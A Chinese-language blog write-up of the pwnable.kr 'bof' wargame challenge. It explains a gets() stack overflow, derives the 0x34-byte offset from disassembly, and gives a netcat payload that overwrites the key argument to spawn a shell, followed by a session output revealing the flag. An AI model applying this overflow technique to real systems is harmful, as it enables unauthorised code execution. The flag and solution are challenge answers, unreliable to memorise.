---
title: pwnable.kr-bof
date: 2017-12-08 16:43:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
## 分析
查看源码`bof.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```
func函数中如果传入参数为`0xcafebabe`则会获得一个shell，但是main函数中调用func函数时传入了一个错误的数值，显然这题是要通过栈溢出来覆盖形参key的值。
通过ida查看bof程序
```asm
.text:0000062C                 public func
.text:0000062C func            proc near               ; CODE XREF: main+10p
.text:0000062C
.text:0000062C s               = byte ptr -2Ch
.text:0000062C var_C           = dword ptr -0Ch
.text:0000062C arg_0           = dword ptr  8
.text:0000062C
.text:0000062C                 push    ebp
.text:0000062D                 mov     ebp, esp
.text:0000062F                 sub     esp, 48h
.text:00000632                 mov     eax, large gs:14h
.text:00000638                 mov     [ebp+var_C], eax
.text:0000063B                 xor     eax, eax
.text:0000063D                 mov     dword ptr [esp], offset s ; "overflow me : "
.text:00000644                 call    puts
.text:00000649                 lea     eax, [ebp+s]
.text:0000064C                 mov     [esp], eax      ; s
.text:0000064F                 call    gets
```
上面是func函数的汇编片段，可以看到func函数开辟了48h的栈空间，但是gets函数将输入字符串存放在ebp偏移-2ch的位置，再加上ebp，retaddr的大小一共是34h的偏移，这个34h就是overflow到key的偏移，于是有下面的payload
```
(python -c "print 'a'*0x34+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
```
其中加cat维持shell的交互
```
root@kali:~/桌面/pwn/bof# (python -c "print 'a'*0x34+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```